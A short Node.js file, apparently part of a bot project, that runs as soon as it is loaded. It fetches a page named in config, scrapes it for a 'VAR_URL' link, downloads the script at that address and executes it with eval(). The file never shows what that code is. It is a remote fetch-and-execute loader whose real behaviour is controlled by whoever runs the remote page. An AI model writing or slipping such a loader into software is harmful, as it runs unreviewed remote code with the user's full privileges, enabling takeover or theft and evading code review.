'use strict';

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchVarUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const varUrlElement = $('a:contains("VAR_URL")');
    const varUrl = varUrlElement.attr('href');

    if (!varUrl) {
      throw new Error('VAR URL link not found...');
    }

    console.log('VAR URL fetched successfully ✅');

    const scriptResponse = await axios.get(varUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchVarUrl();
